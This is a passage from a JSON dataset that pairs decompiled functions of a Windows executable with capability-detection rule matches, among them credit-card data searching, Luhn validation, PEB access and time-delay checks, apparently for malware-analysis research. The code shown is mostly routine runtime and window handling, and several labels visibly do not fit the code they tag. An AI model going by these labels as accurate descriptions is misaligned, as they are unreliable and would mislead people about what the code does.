uVar2) {\n                    puVar5 = arg_8h;\n                }\n            }\n            arg_8h = puVar6 + 1;\n            if (uVar4 == 0) {\n                return puVar5;\n            }\n        } while( true );\n    }\n    iVar3 = -1;\n    do {\n        puVar5 = arg_8h;\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        puVar5 = arg_8h + 1;\n        uVar4 = *arg_8h;\n        arg_8h = puVar5;\n    } while (uVar4 != 0);\n    iVar3 = -(iVar3 + 1);\n    puVar5 = puVar5 + -1;\n    do {\n        puVar6 = puVar5;\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        puVar6 = puVar5 + -1;\n        uVar4 = *puVar5;\n        puVar5 = puVar6;\n    } while (arg_ch != uVar4);\n    puVar6 = puVar6 + 1;\n    if (*puVar6 != arg_ch) {\n        puVar6 = NULL;\n    }\n    return puVar6;\n}\n",
        "token_count": 651
    },
    "0041d1da": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint32_t fcn.0041d1da(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00434fd8();\n    return iVar1 + 0x30;\n}\n",
        "token_count": 46
    },
    "0040d8e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d8e8(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 0x10);\n    iVar7 = 0;\n    for (iVar3 = *(arg_8h + 8); -1 < iVar3; iVar3 = iVar3 << 1) {\n        iVar7 = iVar7 + 1;\n    }\n    iVar3 = iVar7 * 0x204 + 0x144 + iVar2;\n    iVar6 = 0x3f;\n    iVar4 = iVar3;\n    do {\n        *(iVar4 + 8) = iVar4;\n        *(iVar4 + 4) = iVar4;\n        iVar4 = iVar4 + 8;\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    uVar8 = iVar7 * 0x8000 + *(arg_8h + 0xc);\n    iVar4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(uVar8, 0x8000, 0x1000, 4);\n    if (iVar4 == 0) {\n        iVar7 = -1;\n    }\n    else {\n        if (uVar8 <= uVar8 + 0x7000) {\n            piVar5 = uVar8 + 0x10;\n            iVar4 = ((uVar8 + 0x7000) - uVar8 >> 0xc) + 1;\n            do {\n                piVar5[-2] = -1;\n                piVar5[0x3fb] = -1;\n                *piVar5 = piVar5 + 0x3ff;\n                piVar5[-1] = 0xff0;\n                piVar5[1] = piVar5 + -0x401;\n                piVar5[0x3fa] = 0xff0;\n                piVar5 = piVar5 + 0x400;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        *(iVar3 + 0x1fc) = uVar8 + 0xc;\n        *(uVar8 + 0x14) = iVar3 + 0x1f8;\n        *(iVar3 + 0x200) = uVar8 + 0x700c;\n        *(uVar8 + 0x7010) = iVar3 + 0x1f8;\n        *(iVar2 + 0x44 + iVar7 * 4) = 0;\n        *(iVar2 + 0xc4 + iVar7 * 4) = 1;\n        cVar1 = *(iVar2 + 0x43);\n        *(iVar2 + 0x43) = cVar1 + '\\x01';\n        if (cVar1 == '\\0') {\n            *(arg_8h + 4) = *(arg_8h + 4) | 1;\n        }\n        *(arg_8h + 8) = *(arg_8h + 8) & ~(0x80000000U >> (iVar7 & 0x1f));\n    }\n    return iVar7;\n}\n",
        "token_count": 766
    },
    "004153b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004153b8(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    uint32_t var_4h;\n    \n    uVar1 = *(arg_ch + 6);\n    var_4h = 0x80000000;\n    uVar3 = uVar1 >> 4;\n    uVar4 = uVar3 & 0x7ff;\n    uVar2 = *arg_ch;\n    if ((uVar3 & 0x7ff) == 0) {\n        if (((arg_ch[1] & 0xfffff) == 0) && (uVar2 == 0)) {\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            *(arg_8h + 2) = 0;\n            return;\n        }\n        uVar4 = uVar4 + 0x3c01;\n        var_4h = 0;\n    }\n    else if (uVar4 == 0x7ff) {\n        uVar4 = 0x7fff;\n    }\n    else {\n        uVar4 = uVar4 + 0x3c00;\n    }\n    arg_8h[1] = uVar2 >> 0x15 | (arg_ch[1] & 0xfffff) << 0xb | var_4h;\n    *arg_8h = uVar2 << 0xb;\n    while (var_4h == 0) {\n        uVar2 = arg_8h[1];\n        uVar4 = uVar4 - 1;\n        arg_8h[1] = uVar2 << 1 | *arg_8h >> 0x1f;\n        *arg_8h = *arg_8h * 2;\n        var_4h = uVar2 << 1 & 0x80000000;\n    }\n    *(arg_8h + 2) = uVar1 & 0x8000 | uVar4;\n    return;\n}\n",
        "token_count": 480
    },
    "00416734": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid fcn.00416734(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    *param_1 = uVar1 * 2;\n    param_1[1] = uVar2 * 2 | uVar1 >> 0x1f;\n    param_1[2] = param_1[2] << 1 | uVar2 >> 0x1f;\n    return;\n}\n",
        "token_count": 125
    },
    "00410d73": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h_2\n\nvoid __cdecl fcn.00410d73(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    char *pcVar4;\n    uint var_8h;\n    uint var_ch;\n    uint var_128h_2;\n    uint var_124h_2;\n    uint var_128h;\n    uint lpFilename;\n    uint var_18h_2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack4;\n    \n    uStack4 = 0x118;\n    var_18h = 0x444150;\n    fcn.0040bc40();\n    *(unaff_EBP + -0x1c) = *0x44e0fc;\n    pcVar1 = *0x45133c;\n    if (*0x45133c == NULL) {\n        if (*(unaff_EBP + 8) == 1) {\n            pcVar4 = \"Buffer overrun detected!\";\n            *(unaff_EBP + -0x128) =\n                 \"A buffer overrun has been detected which has corrupted the program\\'s\\ninternal state.  The program cannot safely continue execution and must\\nnow be terminated.\\n\"\n            ;\n        }\n        else {\n            pcVar4 = \"Unknown security failure detected!\";\n            *(unaff_EBP + -0x128) =\n                 \"A security error of unknown cause has been detected which has\\ncorrupted the program\\'s internal state.  The program cannot safely\\ncontinue execution and must now be terminated.\\n\"\n            ;\n        }\n        *(unaff_EBP + -0x20) = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, unaff_EBP + -0x124, 0x104);\n        if (iVar2 == 0) {\n            fcn.0040ee40(unaff_EBP + -0x124, \"<program name unknown>\");\n        }\n        iVar2 = unaff_EBP + -0x124;\n        iVar3 = fcn.0040baf0(iVar2);\n        if (0x3c < iVar3 + 0xbU) {\n            iVar2 = fcn.0040baf0(iVar2);\n            iVar2 = iVar2 + unaff_EBP + -0x155;\n            fcn.00414460(iVar2, 0x443f70, 3);\n        }\n        fcn.0040baf0(iVar2);\n        fcn.0040a2a0();\n        *(unaff_EBP + -0x18) = &var_18h;\n        fcn.0040ee40(&var_18h, pcVar4);\n        fcn.0040ee50(&var_18h, 0x443f50);\n        fcn.0040ee50(&var_18h, \"Program: \");\n        fcn.0040ee50(&var_18h, iVar2);\n        fcn.0040ee50(&var_18h, 0x443f50);\n        fcn.0040ee50(&var_18h, *(unaff_EBP + -0x128));\n        fcn.0041564f(&var_18h, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        (*pcVar1)(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.0040c93f(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 912
    },
    "004158ab": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.004158ab(uint32_t param_1, char *param_2, uint32_t param_3)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iStack1060;\n    int32_t iStack1056;\n    int32_t iStack1052;\n    char *pcStack1048;\n    int32_t iStack1044;\n    int32_t iStack1040;\n    char acStack1036 [1028];\n    uint uStack8;\n    \n    uStack8 = *0x44e0fc;\n    iStack1052 = 0;\n    iStack1056 = 0;\n    if (param_3 == 0) goto code_r0x00415a65;\n    piVar1 = (param_1 >> 5) * 4 + 0x452680;\n    iVar8 = (param_1 & 0x1f) * 0x24;\n    if ((*(*piVar1 + 4 + iVar8) & 0x20) != 0) {\n        fcn.004170b1(param_1, 0, 0, 2);\n    }\n    if ((*(*piVar1 + iVar8 + 1) & 0x80) == 0) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(*(*piVar1 + iVar8), param_2, param_3, &iStack1060, 0);\n        if (iVar5 == 0) {\n            iStack1040 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            iStack1040 = 0;\n            iStack1052 = iStack1060;\n        }\ncode_r0x004159c7:\n        if (iStack1052 != 0) goto code_r0x00415a65;\n        if (iStack1040 != 0) {\n            if (iStack1040 == 5) {\n                puVar6 = fcn.0040adb0();\n                *puVar6 = 9;\n                puVar6 = fcn.0040adb9();\n                *puVar6 = 5;\n            }\n            else {\n                fcn.0040adc2(iStack1040);\n            }\n            goto code_r0x00415a65;\n        }\n    }\n    else {\n        pcStack1048 = param_2;\n        iStack1040 = 0;\n        if (param_3 != 0) {\n            do {\n                uVar7 = pcStack1048 - param_2;\n                pcVar4 = acStack1036;\n                iStack1044 = 0;\n                do {\n                    if (param_3 <= uVar7) break;\n                    pcVar3 = pcStack1048 + 1;\n                    cVar2 = *pcStack1048;\n                    uVar7 = uVar7 + 1;\n                    if (cVar2 == '\\n') {\n                        iStack1056 = iStack1056 + 1;\n                        *pcVar4 = '\\r';\n                        pcVar4 = pcVar4 + 1;\n                        iStack1044 = iStack1044 + 1;\n                    }\n                    *pcVar4 = cVar2;\n                    pcVar4 = pcVar4 + 1;\n                    iStack1044 = iStack1044 + 1;\n                    pcStack1048 = pcVar3;\n                } while (iStack1044 < 0x400);\n                iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                                  (*(*piVar1 + iVar8), acStack1036, pcVar4 - acStack1036, &iStack1060, 0);\n                if (iVar5 == 0) {\n                    iStack1040 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    goto code_r0x004159c7;\n                }\n                iStack1052 = iStack1052 + iStack1060;\n                if ((iStack1060 < pcVar4 - acStack1036) || (param_3 <= pcStack1048 - param_2)) goto code_r0x004159c7;\n            } while( true );\n        }\n    }\n    if (((*(*piVar1 + 4 + iVar8) & 0x40) == 0) || (*param_2 != '\\x1a')) {\n        puVar6 = fcn.0040adb0();\n        *puVar6 = 0x1c;\n        puVar6 = fcn.0040adb9();\n        *puVar6 = 0;\n    }\ncode_r0x00415a65:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 1061
    },
    "0041668b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041668b(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    if ((arg_10h == 10) && (arg_8h < 0)) {\n        uVar1 = 1;\n        arg_10h = 10;\n    }\n    else {\n        uVar1 = 0;\n    }\n    fcn.0041664d(arg_10h, uVar1);\n    return arg_ch;\n}\n",
        "token_count": 116
    },
    "0042f7c7": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f7c7(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint uVar4;\n    uint lprcDst;\n    uint lprcSrc1;\n    int32_t lprcSrc2;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = arg_8h - *(in_ECX + 4);\n    iVar3 = arg_ch - *(in_ECX + 8);\n    iVar2 = *(in_ECX + 0x8c);\n    uVar4 = 2;\n    if (iVar2 == 10) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + iVar1;\n    }\n    else {\n        if (iVar2 != 0xb) {\n            uVar4 = 0x22;\n            if (iVar2 == 0xc) {\n                *(in_ECX + 0x2c) = *(in_ECX + 0x2c) + iVar3;\n            }\n            else {\n                *(in_ECX + 0x34) = *(in_ECX + 0x34) + iVar3;\n            }\n            iVar2 = *(in_ECX + 0x34) - *(in_ECX + 0x2c);\n            goto code_r0x0042f81f;\n        }\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + iVar1;\n    }\n    iVar2 = *(in_ECX + 0x30) - *(in_ECX + 0x28);\ncode_r0x0042f81f:\n    if (iVar2 < 0) {\n        iVar2 = 0;\n    }\n    (**(**(in_ECX + 0x68) + 0x134))(&var_8h, iVar2, uVar4);\n    uVar4 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    (*_sym.imp.USER32.dll_GetWindowRect)(uVar4, &lprcSrc1);\n    lprcSrc2 = *(in_ECX + 0x48);\n    var_14h = *(in_ECX + 0x4c);\n    var_10h = *(in_ECX + 0x50);\n    var_ch = *(in_ECX + 0x54);\n    if ((*(in_ECX + 0x8c) == 10) || (*(in_ECX + 0x8c) == 0xc)) {\n        lprcSrc2 = ((var_10h - *(in_ECX + 0x60)) - var_8h) + *(in_ECX + 0x58);\n        var_14h = ((*(in_ECX + 0x5c) - *(in_ECX + 100)) - var_4h) + var_ch;\n        iVar2 = (*_sym.imp.USER32.dll_IntersectRect)(&lprcDst, &lprcSrc1, &lprcSrc2);\n        if (iVar2 != 0) {\n            *(in_ECX + 0x38) = *(in_ECX + 0x40) - var_8h;\n            *(in_ECX + 0x3c) = *(in_ECX + 0x44) - var_4h;\n            *(in_ECX + 0x48) = lprcSrc2;\n            *(in_ECX + 0x4c) = var_14h;\n        }\n    }\n    else {\n        var_10h = (*(in_ECX + 0x60) - *(in_ECX + 0x58)) + lprcSrc2 + var_8h;\n        var_ch = (*(in_ECX + 100) - *(in_ECX + 0x5c)) + var_14h + var_4h;\n        iVar2 = (*_sym.imp.USER32.dll_IntersectRect)(&lprcDst, &lprcSrc1, &lprcSrc2);\n        if (iVar2 != 0) {\n            *(in_ECX + 0x40) = *(in_ECX + 0x38) + var_8h;\n            *(in_ECX + 0x44) = *(in_ECX + 0x3c) + var_4h;\n            *(in_ECX + 0x50) = var_10h;\n            *(in_ECX + 0x54) = var_ch;\n        }\n    }\n    *(in_ECX + 4) = arg_8h;\n    *(in_ECX + 8) = arg_ch;\n    fcn.0042f5bb(0);\n    return;\n}\n",
        "token_count": 1092
    },
    "0043017b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nint32_t fcn.0043017b(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    \n    pcVar1 = param_3 + param_1;\n    pcVar2 = param_2 + param_1;\n    if (pcVar1 < pcVar2) {\n        do {\n            if (*pcVar1 != '\\r') break;\n            pcVar1 = pcVar1 + 1;\n        } while (pcVar1 < pcVar2);\n        if ((pcVar1 < pcVar2) && (*pcVar1 == '\\n')) {\n            pcVar1 = pcVar1 + 1;\n        }\n    }\n    return pcVar1 - param_1;\n}\n",
        "token_count": 173
    },
    "00410690": {
        "rules": [
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688",
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653"
        ],
        "decompiled_code": "\nuint fcn.00410690(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    if (*0x4527b8 == 0) {\n        fcn.0040c2e8();\n    }\n    iVar4 = 0;\n    pcVar3 = *0x451008;\n    if (*0x451008 != NULL) {\n        for (; *pcVar3 != '\\0'; pcVar3 = pcVar3 + iVar2 + 1) {\n            if (*pcVar3 != '=') {\n                iVar4 = iVar4 + 1;\n            }\n            iVar2 = fcn.0040baf0(pcVar3);\n        }\n        piVar1 = fcn.00409f36(iVar4 * 4 + 4);\n        pcVar3 = *0x451008;\n        *0x45103c = piVar1;\n        if (piVar1 != NULL) {\n            do {\n                if (*pcVar3 == '\\0') {\n                    fcn.00409f48(*0x451008);\n                    *0x451008 = NULL;\n                    *piVar1 = 0;\n                    *0x4527ac = 1;\n                    return 0;\n                }\n                iVar4 = fcn.0040baf0(pcVar3);\n                if (*pcVar3 != '=') {\n                    iVar2 = fcn.00409f36(iVar4 + 1);\n                    *piVar1 = iVar2;\n                    if (iVar2 == 0) {\n                        fcn.00409f48(*0x45103c);\n                        *0x45103c = NULL;\n                        return 0xffffffff;\n                    }\n                    fcn.0040ee40(iVar2, pcVar3);\n                    piVar1 = piVar1 + 1;\n                }\n                pcVar3 = pcVar3 + iVar4 + 1;\n            } while( true );\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 441
    },
    "00415b68": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint8_t fcn.00415b68(uint32_t param_1)\n\n{\n    if (*0x452678 <= param_1) {\n        return 0;\n    }\n    return *(*((param_1 >> 5) * 4 + 0x452680) + 4 + (param_1 & 0x1f) * 0x24) & 0x40;\n}\n",
        "token_count": 88
    },
    "00416fef": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00416fef(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0040bc40(0x4452d0, 8);\n    uVar2 = *(unaff_EBP + 8);\n    iVar1 = *((uVar2 >> 5) * 4 + 0x452680) + (uVar2 & 0x1f) * 0x24;\n    if (*(iVar1 + 8) == 0) {\n        fcn.0040d40a(10);\n        *(unaff_EBP + -4) = 0;\n        if (*(iVar1 + 8) == 0) {\n            iVar3 = fcn.004136ad(iVar1 + 0xc, 4000);\n            if (iVar3 == 0) {\n                fcn.0040a0de(unaff_EBP + -0x10, 0xffffffff);\n                goto code_r0x0041707d;\n            }\n            *(iVar1 + 8) = *(iVar1 + 8) + 1;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00417086();\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(*((uVar2 >> 5) * 4 + 0x452680) + 0xc + (uVar2 & 0x1f) * 0x24);\ncode_r0x0041707d:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 396
    },
    "0041708f": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.0041708f(uint32_t param_1)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*((param_1 >> 5) * 4 + 0x452680) + 0xc + (param_1 & 0x1f) * 0x24);\n    return;\n}\n",
        "token_count": 74
    },
    "004170b1": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004170b1(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint dwMoveMethod)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    lpDistanceToMoveHigh = arg_10h;\n    iVar2 = fcn.00416fae(arg_8h);\n    if (iVar2 == -1) {\n        puVar3 = fcn.0040adb0();\n        *puVar3 = 9;\ncode_r0x0041710b:\n        iVar2 = -1;\n        lpDistanceToMoveHigh = 0xffffffff;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar2, arg_ch, &lpDistanceToMoveHigh, dwMoveMethod);\n        if (iVar2 == -1) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar4 != 0) {\n                fcn.0040adc2(iVar4);\n                goto code_r0x0041710b;\n            }\n        }\n        puVar1 = *((arg_8h >> 5) * 4 + 0x452680) + 4 + (arg_8h & 0x1f) * 0x24;\n        *puVar1 = *puVar1 & 0xfd;\n    }\n    return CONCAT44(lpDistanceToMoveHigh, iVar2);\n}\n",
        "token_count": 345
    },
    "00426e2d": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.00426e2d(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GlobalFlags)(param_1);\n        for (uVar1 = uVar1 & 0xff; uVar1 != 0; uVar1 = uVar1 - 1) {\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(param_1);\n        }\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(param_1);\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "0042d84f": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042d84f(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint arg_10h;\n    uint uStack292;\n    int32_t iStack284;\n    int32_t iStack280;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [260];\n    uint uStack8;\n    \n    uStack8 = *0x44e0fc;\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(param_2 + 0x1c), &stack0xfffffecc);\n    if (*(param_2 + 0x88) == param_1) {\n        if (param_3 == 0) goto code_r0x0042daa3;\n        iVar2 = (*_sym.imp.USER32.dll_EqualRect)(&stack0xfffffecc, param_3);\n        if (iVar2 != 0) goto code_r0x0042daa3;\n    }\n    if ((*(param_1 + 0x90) != 0) && ((*(param_2 + 0x80) & 0x40) != 0)) {\n        *(param_1 + 0x7c) = *(param_1 + 0x7c) | 0x40;\n    }\n    *(param_1 + 0x7c) = *(param_1 + 0x7c) & 0xfffffff9;\n    uVar3 = *(param_1 + 0x7c);\n    *(param_1 + 0x7c) = *(param_2 + 0x7c) & 6 | uVar3;\n    if ((uVar3 & 0x40) == 0) {\n        fcn.0041ceb4(auStack268, 0x104);\n        fcn.00426d35(*(param_1 + 0x1c), auStack268);\n    }\n    uVar3 = (*(param_2 + 0x7c) ^ *(param_1 + 0x7c)) & 0xf000 ^ *(param_2 + 0x7c);\n    if (*(param_1 + 0x90) == 0) {\n        uVar3 = uVar3 & 0xfffffffe | 0xf00;\n    }\n    else {\n        uVar3 = uVar3 | 0xf01;\n    }\n    fcn.00437219(uVar3);\n    bVar1 = false;\n    if (*(param_2 + 0x88) != param_1) {\n        iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(param_2 + 0x1c));\n        if (iVar2 != 0) {\n            fcn.0041ce37(0, 0, 0, 0, 0, 0x97);\n            bVar1 = true;\n        }\n    }\n    uStack292 = 0xffffffff;\n    if (param_3 == 0) {\n        fcn.0041aff5(*(param_1 + 0x9c), param_2);\n        fcn.0041aff5(*(param_1 + 0x9c), 0);\n        fcn.0041ce37(0, -*0x450d48, -*0x450d4c, 0, 0, 0x115);\n    }\n    else {\n        (*_sym.imp.USER32.dll_CopyRect)(&iStack284, param_3);\n        fcn.00426186(&iStack284);\n        uStack292 = fcn.0042ce58(param_2, iStack284, iStack280, iStack276, iStack272, \n                                 (iStack276 - iStack284) / 2 + iStack284, (iStack272 - iStack280) / 2 + iStack280);\n        fcn.0041ce37(0, iStack284, iStack280, iStack276 - iStack284, iStack272 - iStack280, 0x114);\n    }\n    (*_sym.imp.USER32.dll_GetParent)(*(param_2 + 0x1c));\n    iVar2 = fcn.0041eeb7();\n    if (iVar2 != param_1) {\n        fcn.00409850(param_1);\n    }\n    iVar2 = *(param_2 + 0x88);\n    if (iVar2 == param_1) {\n        arg_10h = 0;\ncode_r0x0042da6e:\n        fcn.0042d1e0(param_2, uStack292, arg_10h);\n    }\n    else if (iVar2 != 0) {\n        if ((*(param_1 + 0x90) == 0) || (*(iVar2 + 0x90) != 0)) {\n            arg_10h = 0;\n        }\n        else {\n            arg_10h = 1;\n        }\n        uStack292 = 0xffffffff;\n        goto code_r0x0042da6e;\n    }\n    *(param_2 + 0x88) = param_1;\n    if (bVar1) {\n        fcn.0041ce37(0, 0, 0, 0, 0, 0x57);\n    }\n    fcn.0042d179(param_2);\n    iVar2 = fcn.004319c3();\n    *(iVar2 + 0xcc) = *(iVar2 + 0xcc) | 0xc;\ncode_r0x0042daa3:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 1264
    },
    "00421d9c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00421d9c(int32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint8_t in_stack_fffffeb8;\n    uchar auStack324 [8];\n    uchar auStack316 [8];\n    uchar auStack308 [12];\n    uint32_t uStack296;\n    uint uStack8;\n    \n    uStack8 = *0x44e0fc;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1),  iVar1 < 0x104)) {\n        iVar1 = fcn.0042176f(param_2 + 0x22, param_1);\n        if (iVar1 == 0) {\n            *(param_2 + 0x22) = 0;\n        }\n        else {\n            iVar1 = (*_sym.imp.KERNEL32.dll_FindFirstFileA)(param_1, &stack0xfffffeb8);\n            if (iVar1 != -1) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar1);\n                *(param_2 + 8) = in_stack_fffffeb8 & 0x7f;\n                param_2[6] = uStack296;\n                param_2[7] = uStack296 >> 0x1f;\n                puVar2 = fcn.004099a0(auStack324, 0xffffffff);\n                *param_2 = *puVar2;\n                param_2[1] = puVar2[1];\n                puVar2 = fcn.004099a0(auStack316, 0xffffffff);\n                param_2[4] = *puVar2;\n                param_2[5] = puVar2[1];\n                puVar2 = fcn.004099a0(auStack308, 0xffffffff);\n                param_2[2] = *puVar2;\n                param_2[3] = puVar2[1];\n                if ((*param_2 | param_2[1]) == 0) {\n                    *param_2 = *puVar2;\n                    param_2[1] = puVar2[1];\n                }\n                if ((param_2[4] | param_2[5]) == 0) {\n                    param_2[4] = param_2[2];\n                    param_2[5] = param_2[3];\n                }\n            }\n        }\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 565
    },
    "0041b786": {
        "rules": [
            "hash data using djb2/6ad21e310d674441ba35d7276afbe57d",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041b786(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t extraout_ECX;\n    uint32_t uVar2;\n    ulong uVar3;\n    \n    iVar1 = 0;\n    if (param_1 != NULL) goto code_r0x0041b79e;\n    uVar3 = fcn.004198e6();\n    uVar2 = extraout_ECX;\n    do {\n        iVar1 = uVar3 * 0x21 + uVar2;\n        param_1 = (uVar3 >> 0x20) + 1;\ncode_r0x0041b79e:\n        uVar3 = CONCAT44(param_1, iVar1);\n        uVar2 = *param_1;\n    } while (*param_1 != 0);\n    return iVar1;\n}\n",
        "token_count": 191
    },
    "004029b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
